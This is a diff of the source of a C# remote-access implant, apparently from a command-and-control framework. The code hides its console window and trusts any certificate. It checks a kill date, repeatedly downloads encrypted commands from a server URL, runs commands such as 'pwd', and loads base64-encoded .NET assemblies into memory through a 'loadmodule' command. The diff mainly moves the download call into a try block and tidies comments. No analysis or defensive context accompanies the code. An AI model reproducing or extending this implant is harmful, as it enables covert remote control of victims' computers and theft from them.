@@ -30,7 +30,7 @@ public class Program
     var handle = GetConsoleWindow();
     ShowWindow(handle, SW_HIDE);
     AllowUntrustedCertificates();
-    try	{ primer(); } catch {}
+    try	{ primer(); } catch { }
     Thread.Sleep(300000);
     try { primer(); } catch { }
     Thread.Sleep(600000);
@@ -311,12 +311,12 @@ public class Program
       if (killDate < now){
         System.Environment.Exit(1);
       }
-      
-  		var cmd = GetWebRequest(null).DownloadString(URL);
       string output = "";
-  		try {
+      try {
+        string cmd = null;
         string x = "";
-  			try {
+        try {
+          cmd = GetWebRequest(null).DownloadString(URL);
           x = Decryption(Key, cmd);
           x  = x.Replace("\0", string.Empty);
         } catch {}
@@ -329,7 +329,7 @@ public class Program
             output = "";
             //add download-file
             //add upload-file
-            //add implant-core features, screenshot, tasklist, etc
+            //add implant-core features, screenshot, etc
 
             if (c.ToLower() == "pwd") {
               output =  Directory.GetCurrentDirectory();
@@ -365,17 +365,11 @@ public class Program
               output = stringOutput.ToString();
             }
                       
-            // load and execute assembly in current app domain
             if (c.ToLower().StartsWith("loadmodule")){
-              //var stringOutput = new StringWriter();
-	            //Console.SetOut(stringOutput);
 	            string module = Regex.Replace(c, "loadmodule", "", RegexOptions.IgnoreCase);
               Assembly assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
-              //var pop = assembly.GetType("Seatbelt.Program").InvokeMember("UserChecks", BindingFlags.InvokeMethod, null, null, null);
-              //output = stringOutput.ToString();
             }
             
-            // list loaded assemblies
             if (c.ToLower().StartsWith("listmodules")){
               var appd = AppDomain.CurrentDomain.GetAssemblies();
               foreach (var ass in appd)
